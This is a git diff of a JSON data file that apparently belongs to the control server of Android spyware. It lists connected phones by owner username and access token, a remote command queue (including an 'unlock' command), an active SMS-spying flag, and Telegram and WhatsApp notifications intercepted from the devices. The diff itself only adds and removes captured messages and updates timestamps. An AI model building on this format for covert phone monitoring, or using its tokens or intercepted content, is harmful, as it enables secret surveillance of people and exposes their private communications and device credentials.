@@ -9586,7 +9586,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776769224957,
+    "lastSeen": 1776769227971,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -9643,6 +9643,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 18:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769229058
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16955 pesan baru dari 115 obrolan",
+        "time": "21/04 18:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769229032
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 18:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776769227213
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -13618,30 +13642,6 @@
         "time": "21/04 17:40",
         "pkg": "com.whatsapp",
         "receivedAt": 1776768004920
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "[ suendi ]",
-        "content": "Pesan baru dari 1 chat",
-        "time": "21/04 17:40",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776768004000
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "[ suendi ]",
-        "content": "Pesan baru dari 1 chat",
-        "time": "21/04 17:40",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776768003351
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "[ suendi ]",
-        "content": "Pesan baru dari 1 chat",
-        "time": "21/04 17:40",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776768002692
       }
     ],
     "galleryPhotos": [],
@@ -13660,14 +13660,8 @@
     "deviceName": "HP-BBBB-732D",
     "ownerUsername": "pian",
     "token": "06c7d23d86c7cc434c3d79ed0920fb91",
-    "lastSeen": 1776769225085,
-    "commandQueue": [
-      {
-        "type": "unlock",
-        "payload": {},
-        "sentAt": 1776769225958
-      }
-    ],
+    "lastSeen": 1776769228105,
+    "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:59:07.158Z",
     "deviceInfo": {
